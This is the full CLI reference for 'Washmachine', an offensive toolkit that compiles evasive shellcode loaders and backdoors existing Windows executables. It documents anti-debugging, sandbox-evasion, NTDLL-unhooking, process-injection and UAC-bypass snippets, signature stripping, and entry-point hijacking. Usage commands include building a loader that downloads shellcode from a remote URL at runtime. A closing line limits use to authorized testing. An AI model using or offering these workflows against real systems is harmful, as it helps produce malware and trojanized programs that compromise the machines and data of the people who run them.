---
outline: deep
---

# CLI Reference

```text
washmachine-cli <command> [options]
```

Complete command reference for the Washmachine CLI. All commands, arguments, and options documented here reflect the current implementation and are intended for scripting, automation, and interactive use.

## Execution Modes

Washmachine CLI supports two execution modes:

### One-shot mode

Pass a command and its arguments directly:

```powershell
washmachine-cli compile -s payload.bin -t default
```

The process executes the command and exits with a status code.

### Interactive REPL

Launch without arguments to enter an interactive shell:

```powershell
washmachine-cli
```

The REPL provides:

- **Tab completion** — context-aware suggestions for commands, options, and values
- **Command history** — per-command history (up to 200 entries per scope) navigable with arrow keys
- **Line editing** — cursor movement, insert, delete, Home, End, Ctrl+A, Ctrl+E
- **Sub-shells** — commands like `compile`, `analyze`, `backdoor`, `strip`, and `list` enter dedicated sub-shells when invoked without arguments

::: tip Keyboard Shortcuts
| Key | Action |
|---|---|
| `Tab` | Auto-complete current token |
| `↑` / `↓` | Navigate command history |
| `←` / `→` | Move cursor within line |
| `Home` / `End` | Jump to start / end of line |
| `Ctrl+A` / `Ctrl+E` | Jump to start / end of line |
| `Ctrl+C` | Cancel current input |
:::

## Global Behavior

| Aspect | Detail |
|---|---|
| **Parser style** | `washmachine-cli <command> [options]` |
| **Exit codes** | `0` on success, `1` on argument, runtime, or processing failure |
| **Output** | Human-readable text by default (Spectre.Console); `--json` for machine-readable output |
| **Verbosity** | `--verbose` increases diagnostic output on supported commands |
| **Help** | `--help`, `-h`, or `help` on any command prints usage |
| **Catalog dependency** | Template, snippet, encoder, and envelope selection depends on the YAML catalog at `Assets/default.yaml` |
| **Compiler dependency** | `compile` requires at least one discoverable C++ toolchain (MSVC, GCC, or Clang) |
| **Provisioning** | Encoding and envelope features require Bin2Shell; run `provision` if missing |

## Command Index

| Command | Description |
|---|---|
| [`compile`](#compile) | Build a shellcode loader executable from a template and shellcode input |
| [`analyze`](#analyze) | Perform deep PE file analysis (headers, sections, imports, code caves, security) |
| [`strip`](#strip) | Extract raw executable bytes from a PE file into a flat `.bin` payload |
| [`backdoor`](#backdoor) | Inject shellcode into an existing PE file using multiple injection strategies |
| [`list`](#list) | Enumerate available templates, encoders, envelopes, snippets, or compilers |
| [`provision`](#provision) | Download and install required external tools (Bin2Shell) |
| [`test`](#test) | Run the automated test harness across configured phases |

---

## `compile`

Build a shellcode loader executable by rendering a C++ template with selected snippets and compiling it with an auto-discovered toolchain.

```text
washmachine-cli compile --shellcode <file> [options]
```

### Shellcode source (one required)

| Option | Alias | Description |
|---|---|---|
| `--shellcode` | `-s` | Path to a `.bin` shellcode file |
| `--shellcode-hex` | | Inline hex-encoded shellcode string |
| `--shellcode-url` | `-u` | URL to fetch shellcode from at runtime |

### Options

| Option | Alias | Type | Default | Description |
|---|---|---|---|---|
| `--template` | `-t` | string | `shellcode-minimal` | Template identifier from the YAML catalog |
| `--encoder` | `-e` | int | `0` (none) | Bin2Shell encoder index |
| `--envelope` | `-v` | int | `0` (none) | Bin2Shell envelope index |
| `--snippet` | | `key=value` | | Snippet override (repeatable) |
| `--verbose` | | flag | | Enable verbose diagnostic logging |
| `--json` | | flag | | Emit machine-readable JSON output |

### Processing stages

1. Parse and validate shellcode source arguments.
2. Provision Bin2Shell if encoding/envelope options are set and Bin2Shell is missing.
3. Load the YAML catalog and resolve the selected template.
4. Build a `CppCompilationPlan` — map snippet selections to template placeholders.
5. Apply Bin2Shell encoding/envelope transforms if requested.
6. Render the C++ source by substituting `{{PLACEHOLDER}}` tokens with selected snippets.
7. Discover an available compiler (MSVC → GCC → Clang).
8. Invoke the compiler with optimized flags and link required libraries.
9. Name the output binary `YYYYMMDD_HHMMSS-<sha256prefix>.exe`.
10. Write session artifacts (source, build log) to `logging/session_<id>/`.

### Available templates

| ID | Name | Description |
|---|---|---|
| `default` | Default Loader | Full-featured loader with all protection placeholders |
| `paranoid` | Paranoid Loader | Continuous watchdog thread checking for debuggers and analysis tools |
| `aggressive` | Aggressive Loader | Active anti-analysis countermeasures with continuous monitoring |
| `stealth` | Stealth Loader | Six-layer defense: emulation → sandbox → environment → debugger → payload → execution |
| `minimal` | Shellcode Minimal | Bare-bones loader with only shellcode setup and execution |
| `minimal-dll` | Minimal DLL | DLL with `DllMain` entry point for process injection scenarios |

### Snippet sections

Each template supports a subset of these configurable snippet sections:

| Section | Template Key | Multi-select | Description |
|---|---|---|---|
| Anti Emulation | `antiemulation` | Yes | Delay and resource-exhaustion techniques to defeat emulators |
| Anti Analysis | `antianalysis` | Yes | Tool detection, thread hiding, NTDLL unhooking |
| Anti Debugging | `antidebugging` | Yes | PEB checks, timing, hardware breakpoints, parent process validation |
| Anti Sandbox/VM | `antisandbox` | Yes | CPUID, MAC address, registry, process list, resource checks |
| Guardrails | `guardrail` | Yes | Environment variable, domain, date range, file existence checks |
| Decoy | `decoy` | Yes | Distraction actions (open notepad, show message box, create files) |
| Process Injection | `psinjection` | No | Remote thread, APC queue, process reflection |
| Shellcode Execution | `shellcodeexecution` | No | VirtualAlloc, heap, fiber, callback, threadpool, syscall methods |
| UAC Bypass | `uacb` | No | FodHelper, ComputerDefaults registry hijack |
| Generic Payload | `genericshellcode` | No | Built-in test payloads (calc, MessageBox) |

### JSON output schema

```json
{
  "success": true,
  "outputExePath": "temp/cpp/Compiled Binaries/20260330_120000-a1b2c.exe",
  "generatedSourcePath": "logging/session_.../source.cpp",
  "notes": ["Compiler: cl.exe (MSVC 2022)"],
  "compilerPath": "C:/Program Files/Microsoft Visual Studio/.../cl.exe",
  "conversionSuccess": true,
  "conversionError": null
}
```

### Examples

```powershell
# Compile with default minimal template
washmachine-cli compile -s payload.bin

# Full-featured loader with encoding
washmachine-cli compile -s payload.bin -t default -e 1 -v 2

# Hex input with verbose output
washmachine-cli compile --shellcode-hex FC4883E4F0... --verbose

# URL-based runtime fetch
washmachine-cli compile -u http://host/shell.bin -t stealth

# JSON output for automation
washmachine-cli compile -s payload.bin --json
```

---

## `analyze`

Perform a comprehensive PE file analysis covering headers, sections, imports, exports, resources, TLS, code caves, security features, packing detection, and injection feasibility assessment.

```text
washmachine-cli analyze <pe-file> [--json]
```

### Arguments

| Argument | Type | Description |
|---|---|---|
| `<pe-file>` | positional | Path to the PE file to analyze |

### Options

| Option | Type | Description |
|---|---|---|
| `--json` | flag | Emit the full `PeAnalysisResult` object as JSON |

### Analysis output sections

The text output renders a multi-panel dashboard using Spectre.Console:

| Section | Content |
|---|---|
| **File Overview** | Name, size, SHA-256, architecture, subsystem, compile timestamp, linker version, .NET status |
| **Security Score** | 0–100 score with assessment; flags for ASLR, DEP, CFG, High Entropy VA, SEH, SafeSEH, RFG, Authenticode |
| **PE Headers** | Entry point, image base, checksum, section/file alignment, DLL characteristics, machine type |
| **Sections** | Name, virtual address, virtual size, raw address, raw size, permissions, entropy with visual bar |
| **Security Assessment** | 12 security flags displayed with ✓/✕ status |
| **Imports** | DLL list with function counts; suspicious import detection with reason (up to 50 sensitive APIs) |
| **Exports** | Name, ordinal, RVA, forwarding status |
| **Resources** | Manifest, icon, version info presence; type/name/size table |
| **TLS** | Callback count and addresses |
| **Code Caves** | Total caves and space; section, offset, RVA, size, injectable status (top 10) |
| **Packing/Entropy** | Overall entropy, packing detection result |
| **Injection Feasibility** | Per-method assessment (code cave, new section, section extension, TLS callback, EP hijack) with recommended method |
| **Section Memory Map** | Visual bar chart of section sizes with permission coloring |
| **Virtual Address Space** | Tree view of VA layout |

### Examples

```powershell
# Full text dashboard
washmachine-cli analyze target.exe

# JSON for downstream processing
washmachine-cli analyze target.exe --json
```

---

## `strip`

Extract raw executable bytes from a PE file into a flat binary payload. Supports multiple extraction modes for different use cases.

```text
washmachine-cli strip <pe-file> [options]
```

### Arguments

| Argument | Type | Description |
|---|---|---|
| `<pe-file>` | positional | PE file to extract from |

### Options

| Option | Alias | Type | Default | Description |
|---|---|---|---|---|
| `--output` | `-o` | path | `<input>.bin` | Output file path |
| `--mode` | `-m` | enum | `ep` | Extraction mode (see below) |
| `--section` | | string | | Section name for `section` mode |
| `--range` | | `start:len` | | Raw file range (hex `0x` or decimal) for `range` mode |
| `--no-trim` | | flag | | Disable trailing zero trimming |
| `--analyze` | | flag | | Show analysis without extracting |

### Extraction modes

| Mode | Aliases | Description |
|---|---|---|
| `ep` | `entry-point` | Extract from entry point to end of containing section (default) |
| `section` | | Extract the entire named section |
| `all-exec` | | Concatenate all executable sections |
| `range` | | Extract a raw byte range specified as `offset:length` |

### Examples

```powershell
# Default: entry point to end of .text
washmachine-cli strip loader.exe

# Extract specific section
washmachine-cli strip loader.exe -m section --section .text -o payload.bin

# Raw range (hex offsets)
washmachine-cli strip loader.exe -m range --range 0x400:0x200

# Analyze without extracting
washmachine-cli strip loader.exe --analyze
```

---

## `backdoor`

Inject shellcode into an existing PE file. The service supports multiple injection strategies, register-safe carrier code, exit call patching, and optional session logging with full audit trails.

```text
washmachine-cli backdoor --pe <file> --shellcode <file> [options]
```

### Required arguments

| Option | Alias | Type | Description |
|---|---|---|---|
| `--pe` | | path | Target PE file to backdoor |
| `--shellcode` | `-s` | path | Shellcode `.bin` file to inject |

### Options

| Option | Alias | Type | Default | Description |
|---|---|---|---|---|
| `--output` | `-o` | path | `<input>.backdoored.exe` | Output file path |
| `--method` | `-m` | enum | `code-cave` | Injection method |
| `--encryption` | `--enc` | enum | `none` | Payload encryption (reserved) |
| `--xor-key` | | byte | `0x42` | XOR key for encryption |
| `--carrier` | `--invoke` | enum | `entry-point` | Carrier invocation strategy |
| `--section-name` | | string | `.extra` | Name for new section |
| `--cave-min-size` | | int | `0` | Minimum code cave size in bytes |
| `--no-remove-sig` | | flag | | Retain PE digital signature |
| `--no-patch-subsystem` | | flag | | Don't patch subsystem to GUI |
| `--no-patch-exit` | | flag | | Don't patch exit calls in shellcode |
| `--dry-run` | | flag | | Analyze and plan without injecting |
| `--verbose` | | flag | | Enable verbose diagnostic output |
| `--json` | | flag | | Emit machine-readable JSON |
| `--session-log` | | flag | | Force enable session logging |
| `--no-session-log` | | flag | | Force disable session logging |

### Injection methods

| Method | Aliases | Description |
|---|---|---|
| `code-cave` | `codecave`, `cave` | Locate and use existing null-byte sequences in the `.text` section |
| `new-section` | `newsection`, `section` | Append a new executable section to the PE |
| `section-ext` | `sectionext`, `extend` | Extend the last section and append the payload |

### Carrier invocation

| Strategy | Aliases | Description |
|---|---|---|
| `entry-point` | `entrypoint`, `hijack` | Redirect the PE entry point to the carrier stub, then jump back to the original entry |

### Processing stages

1. Validate inputs and parse injection parameters.
2. Analyze target PE: architecture, sections, entry point, code caves.
3. Read shellcode bytes and compute SHA-256.
4. Run pre-flight checks: .NET assembly, packing, entry point validity, signature presence, cave space.
5. *(If `--dry-run`)* Report analysis and exit.
6. Optionally strip digital signature.
7. Write shellcode payload to selected location.
8. Generate register-safe carrier code (push/pop all registers, call shellcode, restore, jump to original EP).
9. Patch exit calls in shellcode (ExitProcess → ExitThread via Metasploit ROR13 hash detection).
10. Optionally patch subsystem to GUI (suppress console window).
11. Recalculate PE checksum.
12. Write backdoored PE to output path.
13. Log all steps and artifacts to session directory.

### JSON output schema

```json
{
  "success": true,
  "outputPath": "target.backdoored.exe",
  "errorMessage": null,
  "shellcodeAddress": 4198400,
  "carrierAddress": 4198656,
  "shellcodeSize": 512,
  "carrierSize": 128,
  "warnings": [],
  "steps": [
    "Loaded PE: x64 EXE, 15 sections",
    "Found 3 code caves (largest: 1024 bytes)",
    "Wrote shellcode at RVA 0x1000",
    "Patched entry point to carrier"
  ],
  "sessionDirectory": "logging/backdoor_20260330_120000_abc/"
}
```

### Examples

```powershell
# Basic code-cave injection
washmachine-cli backdoor --pe target.exe -s payload.bin

# New section method with custom output
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section -o patched.exe

# Dry run to assess feasibility
washmachine-cli backdoor --pe target.exe -s payload.bin --dry-run

# JSON output with verbose logging
washmachine-cli backdoor --pe target.exe -s payload.bin --json --verbose

# Keep signature and skip exit patching
washmachine-cli backdoor --pe target.exe -s payload.bin --no-remove-sig --no-patch-exit
```

---

## `list`

Enumerate runtime resources available to the generation and compilation pipeline.

```text
washmachine-cli list <target>
```

### Targets

| Target | Aliases | Description |
|---|---|---|
| `templates` | `--templates` | List all C++ loader templates from the YAML catalog |
| `encoders` | `--encoders` | List Bin2Shell encoders and envelopes (requires provisioning) |
| `snippets` | `--snippets` | List all snippet sections and items; defaults marked with ★ |
| `compilers` | `--compilers` | Discover and list available C++ toolchains |

### Compiler discovery order

When listing compilers, the discovery engine searches in this order:

1. **Manual candidates** — user-registered paths
2. **Bundled tools** — `<app>/Tools/` directory (MinGW if present)
3. **Environment variables** — `VCToolsInstallDir`, `VCINSTALLDIR`, `VSINSTALLDIR`
4. **Visual Studio installations** — VS 2022, 2019, 2017 (BuildTools, Community, Professional, Enterprise); legacy 14.0–10.0
5. **System PATH** — `cl.exe`, `g++.exe`, `clang++.exe`

### Examples

```powershell
washmachine-cli list templates
washmachine-cli list encoders
washmachine-cli list snippets
washmachine-cli list compilers
```

---

## `provision`

Download and install required external tools. Currently provisions the Bin2Shell Python tool from GitHub.

```text
washmachine-cli provision
```

The command downloads from `https://github.com/0xhmza/bin2shell`, extracts to `Tools/Bin2Shell/`, and patches algorithm descriptions into `algos.yaml` if missing. A progress bar displays download and installation status.

### Example

```powershell
washmachine-cli provision
```

---

## `test`

Run the automated test harness across configurable phases. Results are written to `test_results.json`.

```text
washmachine-cli test [options]
```

### Options

| Option | Type | Default | Description |
|---|---|---|---|
| `--shellcode` | path | auto-detected | Shellcode `.bin` file for testing |
| `--phase` | `1`/`2`/`3`/`all` | `all` | Test phase to execute |
| `--url` | URL | auto (local HTTP) | URL for web-mode payload delivery |
| `--test-assets` | path | `testing assets/binary/shellcodes` | Directory of shellcode files for Phase 3 |

### Test phases

| Phase | Coverage | Description |
|---|---|---|
| **1** | Encoder × Envelope × Web helper | Tests all encoding and envelope combinations with web delivery |
| **2** | Template × Snippet permutations | Tests all templates with snippet combinations (encoder index 0) |
| **3** | Multiple shellcode inputs | Tests compilation with each `.bin` file in the assets directory |

### Result summary

Results are written to `test_results.json` with counts for: total, passed, compile failures, runtime failures, and security-blocked executions.

### Examples

```powershell
# Run all phases
washmachine-cli test --shellcode messagebox.bin --phase all

# Run phase 1 only with explicit URL
washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin

# Run phase 3 with custom assets
washmachine-cli test --phase 3 --test-assets "testing assets/binary/shellcodes"
```

---

## Exit Codes

| Code | Meaning |
|---|---|
| `0` | Command completed successfully |
| `1` | Argument validation failed, runtime error, or processing failure |

All commands follow this convention. The `test` command delegates exit code behavior to the test harness.

::: warning ⚠️ Security Notice
This toolkit is intended **exclusively** for educational and authorized security testing purposes.
:::
